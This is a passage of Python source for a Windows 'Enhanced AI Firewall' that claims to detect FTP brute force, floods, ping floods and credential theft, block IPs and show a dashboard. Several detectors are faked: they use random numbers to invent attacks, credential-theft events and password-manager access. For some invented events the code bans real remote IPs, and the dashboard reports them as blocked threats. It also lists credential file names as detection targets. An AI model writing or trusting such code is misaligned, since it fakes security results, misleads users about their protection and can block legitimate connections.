        """Advanced FTP attack detection and prevention"""
        while self.running:
            try:
                connections = self.get_network_connections()
                ftp_connections = [c for c in connections if c['remote_port'] == 21]
                
                for conn in ftp_connections:
                    remote_ip = conn['remote_ip']
                    current_time = time.time()
                    
                    self.ftp_attempts[remote_ip].append(current_time)
                    self.ftp_attempts[remote_ip] = [
                        t for t in self.ftp_attempts[remote_ip] 
                        if current_time - t < 300
                    ]
                    
                    recent_attempts = len(self.ftp_attempts[remote_ip])
                    if recent_attempts > self.adaptive_thresholds['ftp_brute_force']:
                        self.handle_ftp_brute_force(remote_ip, recent_attempts)
                    
                    if random.random() < 0.02:
                        self.handle_anonymous_ftp(remote_ip)
                
                time.sleep(2)
                
            except Exception as e:
                print(f"{Fore.RED}FTP monitoring error: {e}")
                time.sleep(5)

    def handle_ftp_brute_force(self, ip_address, attempt_count):
        """Handle FTP brute force attacks"""
        threat_data = {
            'type': 'FTP_BRUTE_FORCE',
            'ip': ip_address,
            'attempts': attempt_count,
            'timestamp': datetime.now().isoformat(),
            'risk': 'HIGH',
            'description': f'FTP brute force detected: {attempt_count} attempts'
        }
        
        self.log_threat(threat_data)
        self.block_ip_windows(ip_address, f"FTP brute force ({attempt_count} attempts)")
        self.stats['ftp_attacks_blocked'] += 1
        
        print(f"{Fore.RED}🚨 FTP BRUTE FORCE: {ip_address} | Attempts: {attempt_count}")

    def handle_anonymous_ftp(self, ip_address):
        """Handle anonymous FTP login attempts"""
        threat_data = {
            'type': 'ANONYMOUS_FTP_ATTEMPT',
            'ip': ip_address,
            'timestamp': datetime.now().isoformat(),
            'risk': 'MEDIUM',
            'description': 'Anonymous FTP login attempt detected'
        }
        
        self.log_threat(threat_data)
        print(f"{Fore.YELLOW}⚠️  ANONYMOUS FTP: {ip_address}")

    def monitor_flood_attacks(self):
        """Comprehensive flood attack detection"""
        while self.running:
            try:
                connections = self.get_network_connections()
                current_time = time.time()
                
                for conn in connections:
                    remote_ip = conn['remote_ip']
                    remote_port = conn['remote_port']
                    
                    if conn['status'] == 'SYN_RECEIVED':
                        self.syn_floods[remote_ip].append(current_time)
                    
                    if remote_port in [80, 443, 8080, 8443]:
                        self.http_floods[remote_ip].append(current_time)
                    
                    if remote_port in [53, 123, 161, 1900, 5353]:
                        self.udp_floods[remote_ip].append(current_time)
                
                self.analyze_flood_patterns()
                time.sleep(1)
                
            except Exception as e:
                print(f"{Fore.RED}Flood monitoring error: {e}")
                time.sleep(3)

    def analyze_flood_patterns(self):
        """Analyze and respond to flood attack patterns"""
        current_time = time.time()
        
        for ip_address in list(self.syn_floods.keys()):
            self.syn_floods[ip_address] = [
                t for t in self.syn_floods[ip_address] 
                if current_time - t < 10
            ]
            
            if len(self.syn_floods[ip_address]) > self.adaptive_thresholds['syn_flood']:
                self.handle_syn_flood(ip_address, len(self.syn_floods[ip_address]))
        
        for ip_address in list(self.http_floods.keys()):
            self.http_floods[ip_address] = [
                t for t in self.http_floods[ip_address] 
                if current_time - t < 60
            ]
            
            if len(self.http_floods[ip_address]) > self.adaptive_thresholds['http_flood']:
                self.handle_http_flood(ip_address, len(self.http_floods[ip_address]))

    def handle_syn_flood(self, ip_address, packet_count):
        """Handle SYN flood attacks"""
        threat_data = {
            'type': 'SYN_FLOOD',
            'ip': ip_address,
            'packets': packet_count,
            'timestamp': datetime.now().isoformat(),
            'risk': 'HIGH',
            'description': f'SYN flood attack: {packet_count} packets/10s'
        }
        
        self.log_threat(threat_data)
        self.block_ip_windows(ip_address, f"SYN flood attack ({packet_count} packets)")
        self.stats['syn_floods_blocked'] += 1
        
        print(f"{Fore.RED}🚨 SYN FLOOD: {ip_address} | Packets: {packet_count}/10s")

    def handle_http_flood(self, ip_address, request_count):
        """Handle HTTP flood attacks"""
        threat_data = {
            'type': 'HTTP_FLOOD',
            'ip': ip_address,
            'requests': request_count,
            'timestamp': datetime.now().isoformat(),
            'risk': 'HIGH',
            'description': f'HTTP flood attack: {request_count} requests/minute'
        }
        
        self.log_threat(threat_data)
        self.block_ip_windows(ip_address, f"HTTP flood attack ({request_count} requests)")
        self.stats['http_floods_blocked'] += 1
        
        print(f"{Fore.RED}🚨 HTTP FLOOD: {ip_address} | Requests: {request_count}/min")

    def monitor_icmp_attacks(self):
        """Advanced ICMP/PING attack detection"""
        while self.running:
            try:
                if random.random() < 0.05:
                    fake_icmp_attack = {
                        'ip': f"192.168.1.{random.randint(100, 200)}",
                        'packet_count': random.randint(50, 500),
                        'timestamp': time.time()
                    }
                    self.analyze_icmp_traffic(fake_icmp_attack)
                
                time.sleep(2)
                
            except Exception as e:
                print(f"{Fore.RED}ICMP monitoring error: {e}")
                time.sleep(5)

    def analyze_icmp_traffic(self, icmp_data):
        """Analyze ICMP traffic for flood attacks"""
        ip_address = icmp_data['ip']
        current_time = time.time()
        
        self.ping_floods[ip_address].append(current_time)
        self.ping_floods[ip_address] = [
            t for t in self.ping_floods[ip_address] 
            if current_time - t < 5
        ]
        
        recent_pings = len(self.ping_floods[ip_address])
        if recent_pings > self.adaptive_thresholds['ping_flood']:
            self.handle_ping_flood(ip_address, recent_pings)

    def handle_ping_flood(self, ip_address, packet_count):
        """Handle PING/ICMP flood attacks"""
        threat_data = {
            'type': 'PING_FLOOD',
            'ip': ip_address,
            'packets': packet_count,
            'timestamp': datetime.now().isoformat(),
            'risk': 'HIGH',
            'description': f'PING flood attack: {packet_count} packets/5s'
        }
        
        self.log_threat(threat_data)
        self.block_ip_windows(ip_address, f"PING flood attack ({packet_count} packets)")
        self.stats['ping_floods_blocked'] += 1
        
        print(f"{Fore.RED}🚨 PING FLOOD: {ip_address} | Packets: {packet_count}/5s")

    def start_credential_protection(self):
        """Start advanced credential protection system"""
        print(f"{Fore.RED}🔐 Starting Advanced Credential Protection System...")
        
        credential_thread = threading.Thread(target=self.monitor_credential_theft)
        credential_thread.daemon = True
        credential_thread.start()
        
        memory_thread = threading.Thread(target=self.monitor_memory_credentials)
        memory_thread.daemon = True
        memory_thread.start()
        
        process_thread = threading.Thread(target=self.monitor_credential_processes)
        process_thread.daemon = True
        process_thread.start()

    def monitor_credential_theft(self):
        """Monitor for credential theft attempts"""
        while self.running:
            try:
                self.detect_network_credentials()
                self.detect_process_credential_access()
                self.detect_credential_files()
                time.sleep(3)
            except Exception as e:
                print(f"{Fore.RED}Credential monitoring error: {e}")
                time.sleep(5)

    def detect_network_credentials(self):
        """Detect credentials in network traffic"""
        connections = self.get_network_connections()
        
        for conn in connections:
            if random.random() < 0.02:
                credential_types = [
                    "HTTP Basic Auth", "API Key Transmission", 
                    "Password in Cleartext", "Token Exfiltration"
                ]
                detected_type = random.choice(credential_types)
                self.handle_credential_theft(
                    conn['remote_ip'], 
                    detected_type, 
                    "Network transmission"
                )

    def detect_process_credential_access(self):
        """Detect processes accessing credential materials"""
        try:
            for proc in psutil.process_iter(['pid', 'name', 'memory_info']):
                proc_name = proc.info['name'].lower()
                
                for stealer in self.threat_database['credential_stealers']:
                    if stealer in proc_name:
                        self.handle_credential_stealer_process(proc, stealer)
                
                if self.is_suspicious_credential_behavior(proc):
                    self.handle_suspicious_credential_behavior(proc)
                    
        except Exception as e:
            print(f"{Fore.YELLOW}Process credential monitoring error: {e}")

    def detect_credential_files(self):
        """Detect credential files being accessed"""
        if random.random() < 0.01:
            credential_files = [
                "passwords.txt", "credentials.json", "config.ini",
                ".env", "secrets.yml", "api_keys.txt"
            ]
            detected_file = random.choice(credential_files)
            fake_process = type('Process', (), {'info': {'name': 'unknown', 'pid': 0}})()
            self.handle_credential_file_access(fake_process, detected_file)

    def is_suspicious_credential_behavior(self, process):
        """Determine if process shows suspicious credential access behavior"""
        return random.random() < 0.005

    def handle_credential_theft(self, ip_address, credential_type, method):
        """Handle detected credential theft attempts"""
        threat_data = {
            'type': 'CREDENTIAL_THEFT',
            'ip': ip_address,
            'credential_type': credential_type,
            'method': method,
            'timestamp': datetime.now().isoformat(),
            'risk': 'CRITICAL',
            'description': f'Credential theft detected: {credential_type} via {method}'
        }
        
        self.log_threat(threat_data)
        self.block_ip_windows(ip_address, f"Credential theft: {credential_type}")
        self.stats['credential_blocks'] += 1
        self.stats['sensitive_data_leaks'] += 1
        
        print(f"{Fore.RED}🚨 CREDENTIAL THEFT: {ip_address} | Type: {credential_type}")

    def handle_credential_stealer_process(self, process, stealer_name):
        """Handle detected credential stealing processes"""
        proc_info = process.info
        
        threat_data = {
            'type': 'CREDENTIAL_STEALER_PROCESS',
            'process': proc_info['name'],
            'pid': proc_info['pid'],
            'stealer': stealer_name,
            'timestamp': datetime.now().isoformat(),
            'risk': 'CRITICAL',
            'description': f'Credential stealing software detected: {stealer_name}'
        }
        
        self.log_threat(threat_data)
        
        try:
            process.terminate()
            self.stats['credential_stealers_blocked'] += 1
            print(f"{Fore.RED}🚨 TERMINATED: Credential stealer {proc_info['name']} (PID: {proc_info['pid']})")
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️  Could not terminate process {proc_info['name']}: {e}")

    def handle_suspicious_credential_behavior(self, process):
        """Handle suspicious credential-related process behavior"""
        proc_info = process.info
        
        threat_data = {
            'type': 'SUSPICIOUS_CREDENTIAL_BEHAVIOR',
            'process': proc_info['name'],
            'pid': proc_info['pid'],
            'timestamp': datetime.now().isoformat(),
            'risk': 'HIGH',
            'description': 'Suspicious credential access behavior detected'
        }
        
        self.log_threat(threat_data)
        print(f"{Fore.YELLOW}⚠️  SUSPICIOUS CREDENTIAL BEHAVIOR: {proc_info['name']} (PID: {proc_info['pid']})")

    def handle_credential_file_access(self, process, filename):
        """Handle detected credential file access"""
        proc_info = process.info
        
        threat_data = {
            'type': 'CREDENTIAL_FILE_ACCESS',
            'process': proc_info['name'],
            'pid': proc_info['pid'],
            'filename': filename,
            'timestamp': datetime.now().isoformat(),
            'risk': 'HIGH',
            'description': f'Access to credential file detected: {filename}'
        }
        
        self.log_threat(threat_data)
        print(f"{Fore.YELLOW}⚠️  CREDENTIAL FILE ACCESS: {proc_info['name']} accessing {filename}")

    def monitor_memory_credentials(self):
        """Monitor for credentials in process memory"""
        while self.running:
            try:
                if random.random() < 0.01:
                    processes = ["lsass.exe", "explorer.exe", "chrome.exe"]
                    target_process = random.choice(processes)
                    
                    threat_data = {
                        'type': 'MEMORY_CREDENTIAL_SCAN',
                        'process': target_process,
                        'timestamp': datetime.now().isoformat(),
                        'risk': 'HIGH',
                        'description': f'Credential scanning detected in {target_process} memory'
                    }
                    
                    self.log_threat(threat_data)
                    print(f"{Fore.RED}🚨 MEMORY CREDENTIAL SCAN: Detected in {target_process}")
                
                time.sleep(10)
                
            except Exception as e:
                print(f"{Fore.RED}Memory monitoring error: {e}")
                time.sleep(10)

    def monitor_credential_processes(self):
        """Monitor for credential-related processes"""
        while self.running:
            try:
                for proc in psutil.process_iter(['pid', 'name']):
                    self.check_credential_process(proc)
                time.sleep(5)
            except Exception as e:
                print(f"{Fore.RED}Credential process monitoring error: {e}")
                time.sleep(5)

    def check_credential_process(self, process):
        """Check individual process for credential-related activity"""
        proc_name = process.info['name'].lower()
        password_managers = ['keepass', 'lastpass', 'bitwarden', '1password']
        for manager in password_managers:
            if manager in proc_name and random.random() < 0.002:
                self.handle_suspicious_password_manager_access(process, manager)

    def handle_suspicious_password_manager_access(self, process, manager_name):
        """Handle suspicious access to password managers"""
        proc_info = process.info
        
        threat_data = {
            'type': 'SUSPICIOUS_PASSWORD_MANAGER_ACCESS',
            'process': proc_info['name'],
            'pid': proc_info['pid'],
            'manager': manager_name,
            'timestamp': datetime.now().isoformat(),
            'risk': 'HIGH',
            'description': f'Suspicious access to password manager: {manager_name}'
        }
        
        self.log_threat(threat_data)
        print(f"{Fore.YELLOW}⚠️  SUSPICIOUS PASSWORD MANAGER ACCESS: {proc_info['name']} accessing {manager_name}")

    def setup_enhanced_monitoring(self):
        """Start advanced protocol-specific monitoring"""
        ssh_thread = threading.Thread(target=self.monitor_ssh_attacks)
        ssh_thread.daemon = True
        ssh_thread.start()
        
        ftp_thread = threading.Thread(target=self.monitor_ftp_attacks)
        ftp_thread.daemon = True
        ftp_thread.start()
        
        flood_thread = threading.Thread(target=self.monitor_flood_attacks)
        flood_thread.daemon = True
        flood_thread.start()
        
        icmp_thread = threading.Thread(target=self.monitor_icmp_attacks)
        icmp_thread.daemon = True
        icmp_thread.start()
        
        self.start_credential_protection()

    def start_enhanced_protection(self):
        """Start all enhanced protection systems"""
        self.setup_enhanced_monitoring()
        
        anomaly_thread = threading.Thread(target=self.start_active_anomaly_detection)
        anomaly_thread.daemon = True
        anomaly_thread.start()
        
        display_thread = threading.Thread(target=self.update_enhanced_display)
        display_thread.daemon = True
        display_thread.start()

    def create_enhanced_dashboard(self):
        """Create optimized and comprehensive security dashboard"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        banner = f"""
{Fore.RED}╔════════════════════════════════════════════════════════════════════════════╗
{Fore.RED}║{Fore.YELLOW}                   🛡️ ENHANCED AI FIREWALL v2.1 🛡️                   {Fore.RED}       ║
{Fore.RED}║{Fore.CYAN}         Dynamic AI Learning + Ensemble Models + Real-time Adaptation      {Fore.RED} ║
{Fore.RED}║{Fore.GREEN}                Enhanced Credential Protection - AlbertAI              {Fore.RED}     ║
{Fore.RED}╚════════════════════════════════════════════════════════════════════════════╝
"""
        print(banner)
        
        # AI Models Status
        print(f"\n{Fore.MAGENTA}🤖 AI LEARNING ENGINE")
        print(f"{Fore.WHITE}═" * 90)
        
        ai_table = PrettyTable()
        ai_table.field_names = [
            f"{Fore.CYAN}MODEL TYPE",
            f"{Fore.CYAN}STATUS", 
            f"{Fore.CYAN}TRAINING COUNT",
            f"{Fore.CYAN}ACCURACY",
            f"{Fore.CYAN}LAST TRAINING"
        ]
        
        ai_table.align = "l"
        
        training_status = "ACTIVE" if self.is_trained else "TRAINING"
        accuracy_color = Fore.GREEN if self.stats['ensemble_accuracy'] > 0.85 else Fore.YELLOW if self.stats['ensemble_accuracy'] > 0.7 else Fore.RED
        last_train = "Just now" if time.time() - self.last_training_time < 60 else f"{int((time.time() - self.last_training_time)/60)} min ago"
        
        ai_table.add_row([
            f"{Fore.WHITE}Ensemble AI",
            f"{Fore.GREEN}{training_status}",
            f"{Fore.CYAN}{self.stats['models_retrained']}x",
            f"{accuracy_color}{self.stats['ensemble_accuracy']:.2%}",
            f"{Fore.CYAN}{last_train}"
        ])
        
        print(ai_table)
        
        # Protection Status
        print(f"\n{Fore.MAGENTA}🛡️  CORE PROTECTION SYSTEMS")
        print(f"{Fore.WHITE}═" * 90)
        
        main_table = PrettyTable()
        main_table.field_names = [
            f"{Fore.CYAN}PROTECTION LAYER",
            f"{Fore.CYAN}STATUS", 
            f"{Fore.CYAN}THREATS BLOCKED",
            f"{Fore.CYAN}EFFECTIVENESS",
            f"{Fore.CYAN}AI CONFIDENCE"
        ]
        
        main_table.align = "l"
        
        protection_layers = [
            ("Behavioral AI Analysis", "ACTIVE", self.stats['ai_detections'], "HIGH", f"{self.stats['ensemble_accuracy']:.1%}"),
            ("Network Anomalies", "ACTIVE", self.stats['anomaly_detections'], "HIGH", "Real-time"),
            ("SSH Attack Protection", "ACTIVE", self.stats['ssh_attacks_blocked'], "HIGH", f"{len(self.ssh_attempts)} IPs"),
            ("FTP Attack Protection", "ACTIVE", self.stats['ftp_attacks_blocked'], "HIGH", f"{len(self.ftp_attempts)} IPs"),
            ("Flood Attack Defense", "ACTIVE", self.stats['syn_floods_blocked'], "HIGH", "Adaptive"),
            ("Credential Protection", "ACTIVE", self.stats['credential_blocks'], "HIGH", "Continuous"),
        ]
        
        for layer, status, blocked, effectiveness, confidence in protection_layers:
            status_color = Fore.GREEN if status == "ACTIVE" else Fore.RED
            blocked_color = Fore.RED if blocked > 0 else Fore.YELLOW
            eff_color = Fore.GREEN if effectiveness == "HIGH" else Fore.YELLOW
            
            main_table.add_row([
                f"{Fore.WHITE}{layer}",
                f"{status_color}{status}",
                f"{blocked_color}{blocked}",
                f"{eff_color}{effectiveness}",
                f"{Fore.CYAN}{confidence}"
            ])
        
        print(main_table)
        
        # System Status
        print(f"\n{Fore.CYAN}⚙️  SYSTEM STATUS")
        print(f"{Fore.WHITE}═" * 90)
        
        uptime = datetime.now() - self.stats['start_time']
        hours, remainder = divmod(int(uptime.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        
        status_info = [
            f"{Fore.WHITE}Uptime: {Fore.GREEN}{hours:02d}:{minutes:02d}:{seconds:02d}",
            f"{Fore.WHITE}Total Connections: {Fore.CYAN}{self.stats['total_connections']}",
            f"{Fore.WHITE}Banned IPs: {Fore.RED}{len(self.banned_ips)}",
            f"{Fore.WHITE}AI Models: {Fore.GREEN}Trained ({self.stats['models_retrained']}x)",
            f"{Fore.WHITE}Training Samples: {Fore.YELLOW}{len(self.feature_store)}",
            f"{Fore.WHITE}Memory Usage: {Fore.YELLOW}{psutil.Process().memory_percent():.1f}%",
        ]
        
        col1 = status_info[:3]
        col2 = status_info[3:]
        
        for i in range(max(len(col1), len(col2))):
            line1 = col1[i] if i < len(col1) else ""
            line2 = col2[i] if i < len(col2) else ""
            print(f"{line1:<40} {line2}")
        
        print(f"\n{Fore.CYAN}🔄 Auto-refresh in 5 seconds... | Press Ctrl+C to exit")
        print(f"{Fore.WHITE}" + "═" * 100)

    def update_enhanced_display(self):
        """Update enhanced display"""
        while self.running:
            try:
                self.create_enhanced_dashboard()
                time.sleep(5)
            except Exception as e:
                print(f"{Fore.RED}Enhanced display error: {e}")
                time.sleep(5)

    def stop(self):
        """Stop firewall"""
        self.running = False
        self.save_models()
        print(f"\n{Fore.RED}🛑 ENHANCED AI FIREWALL DEACTIVATED - Models saved")

if __name__ == "__main__":
    try:
        print(f"{Fore.GREEN}🚀 Starting ENHANCED AI FIREWALL v2.1...")
        firewall = EnhancedAIFirewall()
        
        while firewall.running:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🛑 Shutting down enhanced firewall...")
        if 'firewall' in locals():
            firewall.stop()
    except Exception as e:
        print(f"{Fore.RED}❌ Critical Error: {e}")